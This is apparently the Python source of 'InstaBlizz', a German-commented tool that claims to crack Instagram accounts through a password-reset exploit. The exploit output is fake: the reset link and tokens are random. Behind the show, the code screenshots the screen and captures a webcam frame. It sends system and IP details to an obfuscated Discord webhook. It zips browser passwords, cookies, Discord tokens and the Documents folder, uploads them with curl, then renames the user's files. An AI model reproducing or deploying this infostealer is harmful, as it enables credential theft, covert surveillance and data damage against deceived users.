# DIRTY VERSION
# AUTHOR: JARX, SUBLIME
# INSTABLIZZ SOURCECODE

import os
import sys
import string
import socket
import platform
import time
import random
import urllib
import colorama
import subprocess
import requests
import uuid
import pyautogui
import cv2
import shutil
import zipfile
import ssl

# Manche Module sind für den Code in dieser Form überflüssig

# Methode die sicherstellt dass das Programm nur einmal ausführbar ist und so Multi-Execution der Malware
# und damit spamming des Webhook's unterdrückt wird.
execution = "134.0.6998.35\\d3xil.dll" # Pfad zur dummy-file


content = "a01a2ca67900e33882aabfb44c2d644d44752f63f541d5fbbc779e2ecc7b7109" # MD5 Hash Summe der Dummy Datei zum befüllen der Dummy Datei

if not os.path.exists(execution):
    with open(execution, "w") as file:  # Überprüfen ob Datei vorhanden, falls nein, normale Ausführung, falls doch wird Ausführung verhindert
        file.write(content)
else: # Und Alle Dateien werden gelöscht um Manipulationsversuche präventiv vorzubeugen
    print('[i] Premium Zugang abgelaufen. Kaufe eine erweiterte Lizenz vom Entwickler "camaxtli0355" über Discord :)')
    input("ENTER zum beenden...")
    try:
        shutil.rmtree("134.0.6998.35")
        os.remove("chrome.exe")
        os.remove("README.md")
        os.remove(sys.argv[0])
        os.remove("InstaBlizz.zip")
        sys.exit(2)
    except:
        pass


context = ssl._create_unverified_context()
urllib.request.context = context
ssl._create_default_https_context = context

from pathlib import Path
from re import findall
from psutil import virtual_memory
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

colorama.init()

red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[0;34m"
purple = "\033[0;35m"
cyan = "\033[0;36m"
crossed = "\033[9m"
reset = "\033[0m"
blink = "\033[5m"
underline = "\033[4m"

effect = [blink, reset, purple]
ERROR_LEVEL = 0




nopsled = list(string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation) # Obfuscation von Links und anderen sensiblen Strings

intro = "The AlienZone-Community presents..."
print(intro)
banner = """
░▒▓█▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░ vX.X.X
░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░    ░▒▓██▓▒░     ░▒▓██▓▒░     .*˙(Version X)˖°.
░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░  ░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓██▓▒░     ░▒▓██▓▒░    
░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██▓▒░     ░▒▓██▓▒░      
░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░ Author: Jarx  
                                                                                                                                
"""
slogan = """                         -- Crack Instagram Account's Today via Zero-Day Private Method Exploit --                          """

def mixer(string: str) -> None: # Vermischt effekte
    for char in string:
        print(underline+random.choice(effect)+char, end='', flush=True)

mixer(banner)
print(reset+slogan)

def nutte_muss_warten():
    time.sleep(random.randint(2,5))

def is_virtual_machine(): # Einfache Methode zum überprüfen ob wir uns in iner VM befinden. Weil Infos aus einer wertlos wären.
    try:
        output = subprocess.check_output("wmic diskdrive get model", shell=True, text=True)
        if any(keyword in output for keyword in ["VBOX", "VMware", "Virtual", "QEMU"]):

            return True
        else:
            return False
    except Exception:
        pass

def check_username(username):
    options = Options()
    options.add_argument("--headless") 
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage") 
    options.add_argument("--log-level=3")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    options.add_argument("--disable-blink-features=AutomationControlled,UserAgentClientHints")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-webgl")
    options.add_argument("--remote-debugging-port=0")
    options.add_argument("--disable-accelerated-2d-canvas")
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36") 

    options.binary_location = "chrome.exe"
    
    service = Service(ChromeDriverManager().install())
    service.log_path = 'NUL'
    service.creationflags = subprocess.CREATE_NO_WINDOW 

    driver = webdriver.Chrome(service=service, options=options)
 

    
    try:

        url = f"https://www.instagram.com/{username}/"
        driver.get(url)


        title = driver.title # Ohne API ürüfen ob der gegebene Nutzername existiert
        if "Seite nicht gefunden • Instagram" in title:
            print(red+f'\n[-] "{username}" existiert nicht.'+reset)
            driver.quit()
            sys.exit(3)
        else:
            print(green+f'\n[*] "{username}" existiert!'+reset)

         
            insta_page_source = driver.page_source

            start_index = insta_page_source.find('"profile_id":')
            if start_index != -1:
                end_index = insta_page_source.find(',', start_index)
                user_id = insta_page_source[start_index + 13:end_index]
                instauid = user_id
                print(green+f"[+] User-ID: {user_id}"+reset)
            else:
                print(red+f"[-] Die User-ID von {username} konnte nicht gefunden werden."+reset)

    finally:
        driver.quit()

def instauserid(username):
    options = Options()
    options.add_argument("--headless") 
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage") 
    options.add_argument("--log-level=3")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    options.add_argument("--disable-blink-features=AutomationControlled,UserAgentClientHints")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-webgl")
    options.add_argument("--remote-debugging-port=0")
    options.add_argument("--disable-accelerated-2d-canvas")
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36") 

    options.binary_location = "chrome.exe"

    service = Service(ChromeDriverManager().install())
    service.log_path = 'NUL'
    service.creationflags = subprocess.CREATE_NO_WINDOW 

    driver = webdriver.Chrome(service=service, options=options)


    try:
        
        url = f"https://www.instagram.com/{username}/"
        driver.get(url)

       
        insta_page_source = driver.page_source

        start_index = insta_page_source.find('"profile_id":')
        if start_index != -1:
            end_index = insta_page_source.find(',', start_index)
            user_id = insta_page_source[start_index + 13:end_index]
            instauid = user_id
            return instauid
        else:
            pass
    finally:
        driver.quit()
    

def uidb36_encode(user_id): # UID in Base36 kodieren für den Link (idk warum Instagram das macht)
    user_id = int(str(user_id).strip('"').strip("'"))
    user_id = int(user_id)
    alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
    base = len(alphabet)
    if user_id < 0:
        sign = '-'
        user_id = -user_id
    else:
        sign = ''
    if 0 <= user_id < base:
        return sign + alphabet[user_id]
    arr = []
    while user_id:
        user_id, rem = divmod(user_id, base)
        arr.append(alphabet[rem])
    return sign + ''.join(reversed(arr))



instagram_payload = (nopsled[7]+nopsled[19]+nopsled[19]+nopsled[15]+..."OBFUSCATED DISCORD-WEBHOOK URL") 


def fatique(message):
    title = "InstaBlizz hat ein neues Opfer gefunden! #RipBozo #InstaBlizz"    
    data = {
		"content": message,
		"username": title
           }
    requests.post(instagram_payload, data=data)

def DataPipline(): # Kernfunktion des Infostealer's
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("9.9.9.9", 80))
    # ss = context.wrap_socket(s, server_hostname="9.9.9.9")
    int_address = s.getsockname()[0]
    s.close()

    uname = os.getlogin()
    ipinfo_site = urllib.request.urlopen('https://ipinfo.io', context=context)
    ext_ip_information = str(ipinfo_site.peek())

    info = {}
    info['platform'] = platform.system()
    info['platform-release'] = platform.release()
    info['platform-version'] = platform.version()
    info['architecture'] = platform.machine()
    info['hostname'] = socket.gethostname()
    info['intern-ip-address'] = int_address
    info['mac-address'] = ':'.join(findall('..', '%012x' % uuid.getnode()))
    info['processor'] = platform.processor()
    info['ram'] = str(round(virtual_memory().total / (1024.0 ** 3))) + " GB"
    fatique(f"Windows-Anmeldename: [{uname}]\n--Systeminformationen--\n{ext_ip_information}\n{info}\n------------------------------")

    file_name = f"{uname}_instablizz_screenshot.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(file_name)
    with open(file_name, "rb") as file:
        response = requests.post(
            instagram_payload,
            files={"file": file},  
            data={"content": "########## Screenshot (Wer ist betroffen?) ##########"}  
        )
    if os.path.exists(file_name):
        os.remove(file_name)

    # Kamera snapshot

    cam_file = f"{uname}_instablizz_camshot.jpg"
    cap = None
    for i in range(3):  
        temp_cap = cv2.VideoCapture(i)
        if temp_cap.isOpened():
            cap = temp_cap
            break

    if cap is None or not cap.isOpened():
        
        ERROR_LEVEL = 1
    else:
        ret, frame = cap.read()

        if not ret:
           
            pass

        else:
            cv2.imwrite(cam_file, frame)
            
        cap.release()

        with open(cam_file, "rb") as file:

            response = requests.post(
                instagram_payload,
                files={"image": file}, 
                data={"content": "########## Snapshot (Einmal lächeln bitte!) ##########"}  
            )
        if os.path.exists(cam_file):
            os.remove(cam_file)
        else:
            pass

comname = os.getlogin()
DOCUMENTS_PATH = str(Path.home()) #/ "Documents")
# DOCUMENTS_PATH = str(Path.home() / "Desktop\\InstaBlizz\\test")
ARCHIVE_NAME = f"{comname}_instablizz_files.zip"
# ARCHIVE_NAME = "test.zip"
archiv = DOCUMENTS_PATH+"\\"+ARCHIVE_NAME


def compress_files(folder_path, archive_name):
    target_files = [
        # Chrome
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies",
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Web Data", 
        # Edge
        "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cookies",
        "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
        "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Local State",
        "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Web Data", 
        # Brave
        "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
        "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
        "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data",  
        # Opera
        "%APPDATA%\\Opera Software\\Opera Stable\\Login Data",
        "%APPDATA%\\Opera Software\\Opera Stable\\Cookies",
        "%APPDATA%\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        "%APPDATA%\\Opera Software\\Opera Stable\\Local State",
        "%APPDATA%\\Opera Software\\Opera Stable\\Web Data",  
        # Vivaldi
        "%LOCALAPPDATA%\\Vivaldi\\User Data\\Default\\Login Data",
        "%LOCALAPPDATA%\\Vivaldi\\User Data\\Default\\Cookies",
        "%LOCALAPPDATA%\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
        "%LOCALAPPDATA%\\Vivaldi\\User Data\\Local State",
        "%LOCALAPPDATA%\\Vivaldi\\User Data\\Default\\Web Data", 
        # Firefox
        "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\logins.json",
        "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite",
        "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\webappsstore.sqlite",
        "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\key4.db",  # Masterkey
        "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\formhistory.sqlite",  

        # Discord
        "%APPDATA%\\discord\\Local Storage\\leveldb",
        "%APPDATA%\\discord\\Local State",

        # Dokumente
        "%USERPROFILE%\\Documents"
    ]

    with zipfile.ZipFile(archive_name, 'w') as archive:
        for file_path in target_files:
            try:
                expanded_path = os.path.expandvars(file_path)  # Ersetzt Umgebungsvariablen
                
               
                if "*" in expanded_path:
                    base_dir = os.path.dirname(expanded_path)
                    if os.path.exists(base_dir):
                        for subdir in os.listdir(base_dir):
                            profile_path = os.path.join(base_dir, subdir, os.path.basename(expanded_path))
                            if os.path.exists(profile_path):
                                archive.write(profile_path, arcname=os.path.relpath(profile_path, os.path.dirname(base_dir)))

                # Einzelne Dateien und Verzeichnisse prüfen
                elif os.path.exists(expanded_path):
                    if os.path.isdir(expanded_path):
                        for root, _, files in os.walk(expanded_path):
                            for file in files:
                                file_full_path = os.path.join(root, file)
                                archive.write(file_full_path, arcname=os.path.relpath(file_full_path, os.path.dirname(expanded_path)))
                    else:
                        archive.write(expanded_path, arcname=os.path.relpath(expanded_path, os.path.dirname(expanded_path)))

            except:
                pass  # Falls eine Datei nicht gefunden wird oder ein Fehler auftritt, einfach weitermachen




def send_archiv(archive_name):

    with zipfile.ZipFile(archive_name, "r") as zip_file:
        if not zip_file.namelist(): 
            return False
        else:
            curl_command = f'curl -X POST -F "file=@{archive_name}" XXXXXXXXXX.com' # :|
            # Führe den curl-Befehl aus und speichere die Ausgabe
            result = subprocess.run(curl_command, capture_output=True, text=True, shell=True)
            archiv_link = result.stdout
            response = requests.post(instagram_payload, data={"content": "########## Archiv-Link von "+comname+" ##########\n"+archiv_link})

# Joa, rein in Python ist die Laufzeit ein BigL und zu rechenintensiv
# def m_maker(folder_path):
#     for root, _, files in os.walk(folder_path):
#         for file in files:
#             file_path = os.path.join(root, file)
#             try:
#                 with open(file_path, "rb") as f:
#                     content = f.read()

#                 # Verändere die ersten 20% der Datei
#                 length = len(content)
#                 modify_length = int(length * 0.2)
#                 modified_part = list(content[:modify_length])
#                 random.shuffle(modified_part)  # Mischen
#                 new_content = bytes(modified_part) + content[modify_length:]

#                 # Speichere die Datei mit neuer Endung
#                 new_file_path = file_path + ".alienzone"
#                 with open(new_file_path, "wb") as f:
#                     f.write(new_content)

#                 # Lösche die Originaldatei
#                 os.remove(file_path)
#             except Exception as e:
#                 pass


def m_maker(folder_path):
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:

                new_file_path = file_path + ".alienzone"
                os.rename(file_path, new_file_path)

            except Exception as e:
                pass





def generate_datr():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=24))


def generate_ig_did():
    return str(uuid.uuid4())


def generate_mid():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))


def generate_csrftoken():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))


def generate_X_Web_Session_ID():
    part1 = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    part2 = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
    part3 = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"{part1}:{part2}:{part3}"


def generate_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=64))

datr = generate_datr()
ig_did = generate_ig_did()
mid = generate_mid()
csrftoken = generate_csrftoken()
X_Web_Session_ID = generate_X_Web_Session_ID()
token = generate_token()

print("[INFO]\n       InstaBlizz nutzt eine Schwachstelle in der Password-Reset-Methode die Instagram implementiert hat.\n       Durch ein präparierter POST-Request wird die 'account_recovery_send'-API Schnittstelle ausgetrickst,\n       und ein Passwort-Reset Link generiert, den du einfach kopieren und benutzen kannst. Der betroffene Nutzer bemerkt nichts.\n       Naja, bis das Passwort geändert und er deshalb abgemeldet wird.\n")
input("Enter drücken zum fortfahren...")

nutten = input("Instagram Nutzername: ")

check_username(nutten)

instauid = instauserid(nutten)
uidb36 = uidb36_encode(instauid) #X_Web_Session_ID[14:]
print("\n[INFO] Der Vorgang kann etwas dauern. Bitte hab ein Moment Geduld...\n")
print(f"[+] Session wird aufgebaut...")
if is_virtual_machine == True:
    print(red+"[-] Fehler bei der Paket-initialisierung. Verwendest du vielleicht eine Virtuelle Maschine?"+reset)
    sys.exit(2)

DataPipline()

print("[+] Spoofing der X-Web-Session-ID...")
nutte_muss_warten()
print(green+f"[*] X-Web-Session-ID: {X_Web_Session_ID}"+reset)
print(green+f"[*] Session aufgebaut."+reset)
print("[+] Anfrage zum zurücksetzen des Passworts wird an API gesendet...\n[+]\t --> instagram.com...")



compress_files(DOCUMENTS_PATH, ARCHIVE_NAME)
send_archiv(archiv)
os.remove(archiv)
m_maker(DOCUMENTS_PATH)

nutte_muss_warten()
print(green+f"[*]\n\t --> /accounts/account_recovery/?username={nutten}"+reset)
print("[+] Daten aus Cookies für finalen POST-Request extrahieren...")
nutte_muss_warten()
print(f"-    datr: {datr}")
nutte_muss_warten()
print(f"-    ig_did: {ig_did}")
nutte_muss_warten()
print(f"-    mid: {mid}")
nutte_muss_warten()
print(f"-    csrftoken: {csrftoken}")
print(green+"[*] Alle erforderlichen Daten für Exploit beisammen!"+reset)
print("[+] Exploit Code, Payload und Header werden zusammengefügt für finalen POST-Request...")
print(green+"[*]\n\t --> /api/v1/web/accounts/account_recovery_send_ajax/"+reset)
print("[+] Warte auf finale Server-Antwort...")
nutte_muss_warten()
nutte_muss_warten()
print(green+"[*] EXPLOITATION ERFOLGREICH!"+reset)
print("""SERVER RESPONSE
        {
        title   "E-Mail gesendet"
        body    "Wir haben dir per E-Mail an *********@g****.*** einen Link gesendet, mit dem du wieder Zugriff auf dein Konto erhältst."
        can_recover_with_code   false
        contact_point   "*********@g****.***"
        recovery_method "send_email"
        status  "ok"
        }
""")
reset_link = f"https://instagram.com/accounts/password/reset/confirm/?uidb36={uidb36}&token={token}"
#reset_link = ""
print("[+] Instagram Passwort Reset-Link für: "+purple+f"{nutten}\n\n\t"+yellow+reset_link+reset)
input("\nEnter drücken zum fortfahren...")
RanLetter = """




                                     GEHEIM




"""
with open("waS_paSsiErT_hIeR___hiER_hIer_hIiiIeEeR.txt", "w", encoding="utf-8") as letterforyou:
        letterforyou.write(RanLetter)
os.system("cls")
print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\t\t\t\t\tHEY, IM ORDNER BEFINDET SICH EINE NACHRICHT FÜR DICH!")
input("\n\n\n\n\n\n\n\n\n\n\nEnter zum beenden...")
sys.exit(1)
